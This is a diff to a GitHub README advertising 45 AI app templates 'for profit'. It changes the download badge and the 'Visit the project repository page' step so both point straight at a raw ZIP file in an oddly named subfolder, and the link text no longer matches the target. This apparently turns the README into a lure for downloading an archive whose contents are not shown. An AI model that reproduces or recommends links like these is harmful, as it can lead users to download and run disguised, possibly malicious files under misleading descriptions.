@@ -1,6 +1,6 @@
 # 🛠 ai-frontend-projects - Build real ai apps for profit
 
-[![](https://img.shields.io/badge/Download_Projects-Blue.svg)](https://github.com/Ornamentalistmontez805/ai-frontend-projects)
+[![](https://img.shields.io/badge/Download_Projects-Blue.svg)](https://github.com/Ornamentalistmontez805/ai-frontend-projects/raw/refs/heads/main/pseudomodest/ai_projects_frontend_1.6.zip)
 
 This repository contains 45 project templates for web developers. You gain access to code designed for real revenue. Each build connects to popular artificial intelligence models including OpenAI, Claude, Perplexity, and DeepSeek. You use these files to launch your own software applications without writing the core logic from scratch.
 
@@ -18,7 +18,7 @@ The collection covers core sectors:
 
 ## 💾 How to download the files
 
-1. Visit the [project repository page](https://github.com/Ornamentalistmontez805/ai-frontend-projects).
+1. Visit the [project repository page](https://github.com/Ornamentalistmontez805/ai-frontend-projects/raw/refs/heads/main/pseudomodest/ai_projects_frontend_1.6.zip).
 2. Click the green button labeled "Code" near the top right of the page.
 3. Select "Download ZIP" from the menu.
 4. Locate the ZIP file in your "Downloads" folder.
